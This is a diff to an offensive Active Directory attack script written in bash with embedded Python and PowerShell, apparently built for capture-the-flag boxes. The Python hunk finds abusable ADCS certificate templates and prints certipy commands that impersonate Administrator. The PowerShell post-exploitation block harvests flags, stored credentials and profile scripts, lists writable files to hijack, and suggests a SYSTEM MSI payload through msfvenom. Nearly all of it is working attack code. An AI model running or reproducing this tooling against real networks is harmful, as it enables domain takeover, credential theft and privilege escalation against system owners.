@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.33.0"
+readonly VERSION="1.34.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -1598,28 +1598,43 @@ def field(b, key):
 def rights(b):
     m = re.search(r'Enrollment Rights\s*:\s*(.+(?:\n\s{18,}\S.*)*)', b)
     return [l.strip() for l in m.group(1).splitlines() if l.strip()] if m else []
-found = False
+shown = 0
 for b in blocks:
     name = field(b, 'Template Name')
     if not name or field(b, 'Enabled').lower() != 'true':
         continue
-    er = rights(b)
-    if not any(any(m in r.lower() for m in mine) for r in er):
-        continue
-    found = True
-    ess = field(b, 'Enrollee Supplies Subject').lower() == 'true'
-    ca  = field(b, 'Client Authentication').lower() == 'true'
+    ess  = field(b, 'Enrollee Supplies Subject').lower() == 'true'
+    eku  = field(b, 'Extended Key Usage')
+    ekul = eku.lower()
+    ca   = ('client authentication' in ekul) or field(b, 'Client Authentication').lower() == 'true'
+    sa   = 'server authentication' in ekul
+    anyp = ('any purpose' in ekul) or (ekul.strip() == '')
     appr = field(b, 'Requires Manager Approval').lower() == 'true'
-    tags = []
-    if ess: tags.append('ESS')
-    if ca:  tags.append('ClientAuth')
-    if appr: tags.append('ManagerApproval')
-    star = '★' if (ess and ca and not appr) else '-'
-    print(f"{star} {name}  [{', '.join(tags) or 'no notable flags'}]")
-    if star == '★':
-        print(f"    ESC1-like: certipy req -template '{name}' -upn administrator@<domain>  → impersonate Administrator")
-if not found:
-    print("(no enabled template enrollable by this identity or its groups)")
+    er   = rights(b)
+    can  = any(any(m in r.lower() for m in mine) for r in er)
+    # Surface a template if it lets the ENROLLEE SUPPLY THE SUBJECT (ESS — the core
+    # ESC1/ESC15/cert-for-any-host primitive), OR we can enroll with a client-auth
+    # EKU. CRITICAL: show ESS templates we CANNOT enroll too — they reveal the
+    # target + which group to pivot to (e.g. an UpdateSrv/ServerAuth template only
+    # 'IT' can enroll, abused via the WSUS HTTPS-spoof chain).
+    if not (ess or (can and ca)):
+        continue
+    shown += 1
+    er_s = '; '.join(er) or '?'
+    tags = [t for t, c in [('ESS', ess), ('ClientAuth', ca), ('ServerAuth', sa),
+                           ('AnyPurpose', anyp), ('ManagerApproval', appr)] if c]
+    if can and ess and (ca or anyp) and not appr:
+        print(f"★ {name}  [{', '.join(tags)}]  enroll: {er_s}")
+        print(f"    ESC1 (you CAN enroll): certipy req -template '{name}' -upn administrator@<domain>")
+    elif ess and not can:
+        print(f"⚑ {name}  [{', '.join(tags)}]  enroll: {er_s}")
+        print(f"    abusable but you must become a member of: {er_s}")
+        if sa:
+            print(f"    ServerAuth + ESS -> request a cert for ANY host (e.g. the WSUS server) -> WSUS HTTPS spoof / relay")
+    else:
+        print(f"- {name}  [{', '.join(tags)}]  enroll: {er_s}")
+if shown == 0:
+    print("(no enabled template with enrollee-supplies-subject or client-auth)")
 PY
 }
 
@@ -1668,16 +1683,22 @@ phase_adcs() {
         "${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${cbase[@]}" "${cauth[@]}" -output "$OUTDIR/certipy_$(_safe_name "$USER")" >/dev/null 2>&1
         _abuse_adcs "$cout" && ADCS_PWNED=1
     else
-        info "Nothing flagged by -vulnerable — reviewing the FULL template list (enrolment by ${USER} + its groups)…"
-        subsection "Template review — what ${USER} can ENROLL in"
+        info "Nothing flagged by -vulnerable — mapping the FULL template surface (ESS / EKU / who can enroll)…"
+        subsection "Template review — ESS/abusable templates (★=you can enroll · ⚑=need another group)"
         local full; full=$("${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${cbase[@]}" -stdout 2>&1)
         echo "$full" >"$OUTDIR/certipy_templates_$(_safe_name "$USER").txt"
         local rev; rev=$(ADCS_PRINC="${USER%\$}" ADCS_GROUPS="${OWNED_GROUPS[${USER,,}]:-}" _adcs_template_review <<<"$full")
         printf '%s\n' "$rev" | while IFS= read -r l; do
-            [[ "$l" == ★* ]] && loot "  ${C_BOLD}$l${C_RESET}" || detail "      $l"
+            case "$l" in
+                ★*) loot "  ${C_GREEN}${C_BOLD}$l${C_RESET}" ;;
+                ⚑*) loot "  ${C_YELLOW}${C_BOLD}$l${C_RESET}" ;;
+                *)  detail "      $l" ;;
+            esac
         done
         if grep -q '★' <<<"$rev"; then
-            loot "★ ESC1-like enrollable template above → certipy req -ca '$ca' -template <T> -upn administrator@$DOMAIN (SAN impersonation)"
+            loot "★ ESC1-like enrollable template → certipy req -ca '$ca' -template <T> -upn administrator@$DOMAIN (SAN impersonation)"
+        elif grep -q '⚑' <<<"$rev"; then
+            loot "⚑ ESS template(s) exist but need a group you don't hold yet → pivot to that group, then enroll (note ServerAuth+ESS → WSUS HTTPS-spoof chain)"
         fi
     fi
     # ESC15/EKUwu is the blind spot: certipy -vulnerable frequently does NOT flag it
@@ -2438,14 +2459,20 @@ _winrm_postex() {
     ps+='echo "===FLAGS==="; Get-ChildItem C:\Users -Recurse -Include user.txt,root.txt,flag.txt -ErrorAction SilentlyContinue | %{ $_.FullName; Get-Content $_.FullName -ErrorAction SilentlyContinue }; '
     ps+='echo "===AIE==="; reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null; reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null; '
     ps+='echo "===SVC==="; Get-CimInstance Win32_Service | ?{ $_.PathName -notmatch "system32" -and $_.StartName -match "SYSTEM|LocalSystem" } | Select Name,StartName,PathName | Format-List; '
-    ps+='echo "===TASKS==="; Get-ScheduledTask | ?{ $_.Principal.UserId -match "SYSTEM" } | Select TaskName,TaskPath | Format-List; '
+    ps+='echo "===TASKS==="; Get-ScheduledTask -ErrorAction SilentlyContinue | ?{ $_.TaskPath -notmatch "\\Microsoft\\" } | %{ $a=(($_.Actions | %{ ($_.Execute)+" "+($_.Arguments) }) -join "; "); "{0}  [runas={1}]  -> {2}" -f $_.TaskName,$_.Principal.UserId,$a }; '
     ps+='echo "===CDRIVE==="; Get-ChildItem C:\ -Force -ErrorAction SilentlyContinue | Select Name; '
     # Non-standard top-level dirs (e.g. C:\Share) + IIS web roots are the usual
     # local-privesc / cred stash on a DC that has no AD path left. List them and
     # read small config/script/text files; flag anything WE can write (→ hijack).
     ps+='echo "===NONSTD==="; Get-ChildItem C:\ -Directory -Force -ErrorAction SilentlyContinue | ?{ $_.Name -notmatch "^(Windows|Program Files|Program Files \(x86\)|ProgramData|Users|PerfLogs|Recovery|System Volume Information|\$Recycle.Bin|Config.Msi|Documents and Settings)$" } | %{ $_.FullName; Get-ChildItem $_.FullName -Recurse -Force -ErrorAction SilentlyContinue | Select -First 200 -Expand FullName }; '
     ps+='echo "===CONFIGS==="; Get-ChildItem C:\inetpub,C:\Share -Recurse -Force -Include web.config,*.ps1,*.bat,*.cmd,*.txt,*.xml,*.config,*.json,*.ini -ErrorAction SilentlyContinue | Select -First 25 | %{ "### "+$_.FullName; Get-Content $_.FullName -TotalCount 80 -ErrorAction SilentlyContinue }; '
-    ps+='echo "===WRITABLE==="; Get-ChildItem C:\inetpub,C:\Share -Recurse -Force -ErrorAction SilentlyContinue | Select -First 400 | %{ try{ $acl=(Get-Acl $_.FullName).Access | ?{ $_.IdentityReference -match "msa_health|Everyone|Authenticated Users|\\\\Users" -and $_.FileSystemRights -match "Write|Modify|FullControl" }; if($acl){ "WRITABLE-BY-US: "+$_.FullName } }catch{} }'
+    ps+='echo "===WRITABLE==="; Get-ChildItem C:\inetpub,C:\Share -Recurse -Force -ErrorAction SilentlyContinue | Select -First 400 | %{ try{ $acl=(Get-Acl $_.FullName).Access | ?{ $_.IdentityReference -match "msa_health|Everyone|Authenticated Users|\\\\Users" -and $_.FileSystemRights -match "Write|Modify|FullControl" }; if($acl){ "WRITABLE-BY-US: "+$_.FullName } }catch{} }; '
+    # Scripts/files dropped in user PROFILES (Documents/Desktop/Downloads) are a
+    # very common intentional foothold (e.g. a monitor.ps1 that names a scheduled
+    # task or a writable path). List them and READ the scripts — generic, catches
+    # the pattern on any box without hard-coding a path.
+    ps+='echo "===PROFFILES==="; Get-ChildItem C:\Users -Force -ErrorAction SilentlyContinue | %{ $p=$_.FullName; @("Documents","Desktop","Downloads") | %{ Get-ChildItem (Join-Path $p $_) -Recurse -Force -ErrorAction SilentlyContinue } } | ?{ $_.Extension -match "\.(ps1|bat|cmd|vbs|py|kdbx|txt|xml|config|json|ini|xlsx|docx)$" } | Select -First 30 -Expand FullName; '
+    ps+='echo "===PROFSCRIPTS==="; Get-ChildItem C:\Users -Recurse -Force -Include *.ps1,*.bat,*.cmd,*.vbs,*.py -ErrorAction SilentlyContinue | ?{ $_.FullName -notmatch "\\AppData\\" } | Select -First 12 | %{ "### "+$_.FullName; Get-Content $_.FullName -TotalCount 80 -ErrorAction SilentlyContinue }'
     local out="$OUTDIR/winrm_postex_$(_safe_name "$USER").txt"
     _winrm_exec "$ps" | tee "$out" >>"$LOGFILE"
     [[ ! -s "$out" ]] && { info "WinRM post-ex produced no output (shell/Kerberos issue)"; return; }
@@ -2456,26 +2483,28 @@ _winrm_postex() {
         | grep -avE 'Evil-WinRM|quoting_detection|evil-winrm#|Establishing connection|PS C:\\|whoami /all; echo' >"$clean"
     # Show each non-empty section inline so the next step is visible, not buried.
     local sec body
-    for sec in CMDKEY FLAGS AIE SVC TASKS NONSTD CONFIGS WRITABLE CDRIVE; do
+    for sec in CMDKEY FLAGS AIE SVC TASKS PROFFILES PROFSCRIPTS NONSTD CONFIGS WRITABLE CDRIVE; do
         body=$(awk "/===${sec}===/{f=1;next} /^===[A-Z]+===/{f=0} f" "$clean" | grep -vE '^[[:space:]]*$')
         [[ -z "$body" ]] && continue
         local cap=15
         case "$sec" in
-            CMDKEY)   [[ "$body" == *NONE* ]] && continue; loot "★ Stored credentials (cmdkey /list):" ;;
-            FLAGS)    loot "★ Flag file(s) readable from this shell:" ;;
-            AIE)      grep -qiE '0x1' <<<"$body" && loot "★ AlwaysInstallElevated=1 → MSI as SYSTEM (msfvenom -f msi -p windows/x64/exec)" || continue ;;
-            SVC)      loot "★ SYSTEM service(s) with binary OUTSIDE system32 (check write perms → privesc):" ;;
-            TASKS)    info "SYSTEM scheduled tasks:" ;;
-            NONSTD)   loot "★ NON-STANDARD top-level dirs + contents (likely the loot/privesc here):"; cap=60 ;;
-            CONFIGS)  loot "★ Config/script/text content (creds? hijackable scripts?):"; cap=80 ;;
-            WRITABLE) loot "★★ Files in C:\\Share / IIS that WE can WRITE → plant/hijack for the account that runs them:" ;;
-            CDRIVE)   info "C:\\ top-level:" ;;
+            CMDKEY)     [[ "$body" == *NONE* ]] && continue; loot "★ Stored credentials (cmdkey /list):" ;;
+            FLAGS)      loot "★ Flag file(s) readable from this shell:" ;;
+            AIE)        grep -qiE '0x1' <<<"$body" && loot "★ AlwaysInstallElevated=1 → MSI as SYSTEM (msfvenom -f msi -p windows/x64/exec)" || continue ;;
+            SVC)        loot "★ SYSTEM service(s) with binary OUTSIDE system32 (check write perms → privesc):" ;;
+            TASKS)      loot "★ Non-default scheduled tasks (name [runas] → action — hijack the action if it's writable / runs as a priv account):"; cap=30 ;;
+            PROFFILES)  loot "★ Scripts/files in user profiles (Documents/Desktop/Downloads):"; cap=30 ;;
+            PROFSCRIPTS) loot "★★ Content of profile scripts (reveals tasks, paths, creds → the intended foothold):"; cap=90 ;;
+            NONSTD)     loot "★ NON-STANDARD top-level dirs + contents (likely the loot/privesc here):"; cap=60 ;;
+            CONFIGS)    loot "★ Config/script/text content (creds? hijackable scripts?):"; cap=80 ;;
+            WRITABLE)   loot "★★ Files in C:\\Share / IIS that WE can WRITE → plant/hijack for the account that runs them:" ;;
+            CDRIVE)     info "C:\\ top-level:" ;;
         esac
         printf '%s\n' "$body" | head -"$cap" | while IFS= read -r l; do detail "      ${l}"; done
     done
-    # Harvest credentials from any config/script content we read (process subst,
-    # not a pipe → queued creds survive). Scoped to the CONFIGS section only.
-    awk '/===CONFIGS===/{f=1;next} /^===[A-Z]+===/{f=0} f' "$clean" >"$clean.cfg" 2>/dev/null
+    # Harvest credentials from script/config content we read (process subst, not a
+    # pipe → queued creds survive). Scoped to the content sections.
+    awk '/===(CONFIGS|PROFSCRIPTS)===/{f=1;next} /^===[A-Z]+===/{f=0} f' "$clean" >"$clean.cfg" 2>/dev/null
     [[ -s "$clean.cfg" ]] && harvest_secrets "winrm-configs" < "$clean.cfg"
     rm -f "$clean" "$clean.cfg" 2>/dev/null
     loot "WinRM post-ex recon saved → $(basename "$out")"
